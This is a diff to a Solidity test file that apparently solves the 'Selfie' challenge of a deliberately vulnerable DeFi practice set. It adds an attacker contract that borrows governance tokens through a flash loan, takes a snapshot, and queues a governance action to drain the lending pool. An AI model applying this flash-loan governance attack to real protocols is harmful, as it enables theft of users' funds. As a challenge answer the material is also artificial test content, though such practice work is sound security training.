@@ -40,6 +40,15 @@ contract SelfieTest is Test {
 
     function exploit() public {
         vm.startPrank(player);
+        // first take a flash loan
+        Attack attack = new Attack(address(pool), address(governance), address(token));
+        attack.borrowTokens(TOKENS_IN_POOL);
+
+        // wait for the governance delay
+        skip(2 days);
+
+        // execute the governance action
+        governance.executeAction(attack.actionId());
 
         vm.stopPrank();
     }
@@ -49,5 +58,45 @@ contract SelfieTest is Test {
 
         assertEq(token.balanceOf(player), TOKENS_IN_POOL);
         assertEq(token.balanceOf(address(pool)), 0);
+    }
+}
+
+contract Attack is IERC3156FlashBorrower {
+    SelfiePool public pool;
+    SimpleGovernance public governance;
+    DamnValuableTokenSnapshot public token;
+    uint256 public actionId;
+    address public owner;
+
+    constructor(address _pool, address _governance, address _token) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableTokenSnapshot(_token);
+        owner = msg.sender;
+    }
+
+    function borrowTokens(uint256 _amount) public {
+        pool.flashLoan(this, address(token), _amount, "");
+    }
+
+    function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata)
+        external
+        override
+        returns (bytes32)
+    {
+        if (
+            _initiator != address(this) || msg.sender != address(pool) || address(_token) != address(pool.token())
+                || _fee != 0
+        ) {
+            revert("UnexpectedFlashLoan");
+        }
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
+        // call snapshot() on the token
+        token.snapshot();
+        // queue a governance action to drain the pool
+        actionId = governance.queueAction(address(pool), 0, data);
+        // repay the flash loan
+        token.approve(address(pool), _amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
